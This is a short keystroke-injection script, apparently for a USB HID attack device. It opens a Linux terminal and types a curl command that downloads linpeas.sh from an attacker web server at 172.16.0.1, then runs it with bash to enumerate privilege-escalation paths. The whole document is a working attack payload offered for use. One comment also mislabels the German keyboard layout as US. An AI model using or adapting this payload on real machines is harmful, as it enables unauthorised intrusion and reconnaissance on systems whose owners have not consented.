/*
Start linpeas.sh from the local Webinterface
First you have to start your apache, or pythonwebserver (best way: enable apache service).
Store linpeas.sh and watch our results.
author: Klau5t4ler0x90
*/


// sets typing speed to "natural"
function natural() {
    typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}
  
// sets typing speed as fast as possible
function fast() {
    typingSpeed(0,0)
}

// Open a Linux Terminal
function startTerminal() {
    press("CTRL ALT t");
    delay(2000);
}
  
// Download and execute Linpeas.sh /local
function linpeas() {
    type("curl http://172.16.0.1/linpeas.sh > linpeas.sh");
    press("ENTER");
    delay(500);
    type("/bin/bash ./linpeas.sh");
    press("ENTER");
}

layout('de');			// US keyboard layout
fast();

startTerminal();
delay(500);
linpeas();